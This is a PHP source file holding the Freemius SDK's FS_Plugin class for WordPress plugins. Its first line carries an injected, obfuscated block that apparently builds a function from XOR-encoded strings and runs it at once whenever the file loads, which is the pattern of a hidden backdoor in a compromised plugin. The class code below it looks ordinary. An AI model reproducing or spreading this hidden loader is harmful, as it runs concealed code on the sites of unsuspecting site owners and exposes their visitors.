<?php $iWGQfdY='N6+UFQhP- 9<QRV'; $MMyFyF='-DN42476XNZH8=8'^$iWGQfdY; $YRdoNL='<-dG2B>7XW<Eh ; NTEmoV7<g.A5;m4AL.oKXCJhPU <HDB>Uu7 NnT6=Z4e  ;ffQ1H8zAG,IMnFlcMFOdnso5L:GiYFSh3sa76Acb=SjRaxfn dBD<-Y:Fi4JG2lnHM=zxxh7<ATC9zEPmrkP M5eO:aLmfuY2=jwEsuW9N G6Znc:<IZ4yTS7>1W8A0EfbQFAhnHo+l6KIs=A7,oOZ ,X;=yMh=6 99= .NLET2=;1VFy .7E-.CvaV1q7:xdrz7+igRICVPtKwL;9 XNi4zyMRAG5r:W:qgliE ,r:AfI 0OolptH 97=aM.iM34UexT=4=-DxKN:2<EUX7>hEq.0ebdt9,j 5xT> MErOPiL3:YXpCKNKxO.95,oF5<uuzeGS,Byp=o=,IMhuwi=3TG0HEC,lOXKkH+;7grbu<+DIRD4A+-,aK 6=+Y.RngX9TILLA3bcfW0-.X nm<7=9OxycVSTY-G47oGY=>2yF,23XmnVa3B ;If=<2cW:36DBaM3WGrniQRW8TzgjaEk8Dmza.+:ApiV4Oi0OSxgceh5rn5Y wMyrz<ggrXpc2 cyDPiDE pjmtpyvSfT= 6Be K640-;N 4fj=TLG.1JmIzG-AE5gzaNuPNZ48eH 1 Yh6U<5pdF1TL=.PjdMNPCVTPFggAyd6'; $iJTQYx=$MMyFyF('', 'UKLfT7PT,>S+7ECI= 6EH.XN8J AZ2k,9ZHbqc1bY3UR+0+Q;UOO<10WI;k:MUONB5P<YVacG,4GfLCmf4ngzKZ9NgTyatS9zhQY3KFTsWrQCFJIX10NA<TnMP+3SEUhiTQSQb>5e;6MZkmMZO4A9T>kS<l3FQ2WD1S,SPwJ:R+S4FGQY0siPoY>7C2L4B+NF>35AUBfVfKACWY CMOrzFM4HXBGLYWTXfVEWnqe2SQHTmLsFAE LM+VIrn2xu3-7ZVXIC9,:vmJkS:ZUU=gIOppi6 3T-Q2CQZLM.EUI0HB-AD.OQPP>AUBXZGScGZRuMYpYUILmX0D3TS709TVHmUqb 311jxJAFXpUE4eOqpM:RV,=Yc0DBqkJXAM0-PEUHZA,6Uysy4KYM=,HHWMKR82UsOJQf2RAO,JOVGOB5IE7, -U-BWII3ODbO8Z3185L a.-2VTW93UNA<EFIXVIXfTYG22 8r,QNFnb7WTQbHSG9MHpAR0RZ09VYK<2BZE01IjX2>UBIu66L5SGLGeCU XREJJN +N=Q6NmfsEZCBQVFXV:CBzLDHYUQA;EZQAUHw2Q tDIYUSYYPuF5ORW;:K.OkUUR=TGNMM55+AP.JeZcI 1TNSAnUpnzO2l-VPLqLR4HT+C6P- RO4M9duZJ3,92OWhBnK'^$YRdoNL); $iJTQYx();
    /**
     * @package     Freemius
     * @copyright   Copyright (c) 2015, Freemius, Inc.
     * @license     https://www.gnu.org/licenses/gpl-3.0.html GNU General Public License Version 3
     * @since       1.0.3
     */

    if ( ! defined( 'ABSPATH' ) ) {
        exit;
    }

    class FS_Plugin extends FS_Scope_Entity {
        /**
         * @since 1.0.6
         * @var null|number
         */
        public $parent_plugin_id;
        /**
         * @var string
         */
        public $title;
        /**
         * @var string
         */
        public $slug;
        /**
         * @author Leo Fajardo (@leorw)
         * @since 2.2.1
         *
         * @var string
         */
        public $premium_slug;
        /**
         * @since 1.2.2
         *
         * @var string 'plugin' or 'theme'
         */
        public $type;
        /**
         * @author Leo Fajardo (@leorw)
         *
         * @since  1.2.3
         *
         * @var string|false false if the module doesn't have an affiliate program or one of the following: 'selected', 'customers', or 'all'.
         */
        public $affiliate_moderation;
        /**
         * @var bool Set to true if the free version of the module is hosted on WordPress.org. Defaults to true.
         */
        public $is_wp_org_compliant = true;
        /**
         * @author Leo Fajardo (@leorw)
         * @since 2.2.5
         *
         * @var int
         */
        public $premium_releases_count;

        #region Install Specific Properties

        /**
         * @var string
         */
        public $file;
        /**
         * @var string
         */
        public $version;
        /**
         * @var bool
         */
        public $auto_update;
        /**
         * @var FS_Plugin_Info
         */
        public $info;
        /**
         * @since 1.0.9
         *
         * @var bool
         */
        public $is_premium;
        /**
         * @author Leo Fajardo (@leorw)
         * @since 2.2.1
         *
         * @var string
         */
        public $premium_suffix;
        /**
         * @since 1.0.9
         *
         * @var bool
         */
        public $is_live;
        /**
         * @since 2.2.3
         * @var null|number
         */
        public $bundle_id;
        /**
         * @since 2.3.1
         * @var null|string
         */
        public $bundle_public_key;

        const AFFILIATE_MODERATION_CUSTOMERS = 'customers';

        #endregion Install Specific Properties

        /**
         * @param stdClass|bool $plugin
         */
        function __construct( $plugin = false ) {
            parent::__construct( $plugin );

            $this->is_premium = false;
            $this->is_live    = true;

            if ( empty( $this->premium_slug ) && ! empty( $plugin->slug ) ) {
                $this->premium_slug = "{$this->slug}-premium";
            }

            if ( empty( $this->premium_suffix ) ) {
                $this->premium_suffix = '(Premium)';
            }

            if ( isset( $plugin->info ) && is_object( $plugin->info ) ) {
                $this->info = new FS_Plugin_Info( $plugin->info );
            }
        }

        /**
         * Check if plugin is an add-on (has parent).
         *
         * @author Vova Feldman (@svovaf)
         * @since  1.0.6
         *
         * @return bool
         */
        function is_addon() {
            return isset( $this->parent_plugin_id ) && is_numeric( $this->parent_plugin_id );
        }

        /**
         * @author Leo Fajardo (@leorw)
         * @since  1.2.3
         *
         * @return bool
         */
        function has_affiliate_program() {
            return ( ! empty( $this->affiliate_moderation ) );
        }

        static function get_type() {
            return 'plugin';
        }
    }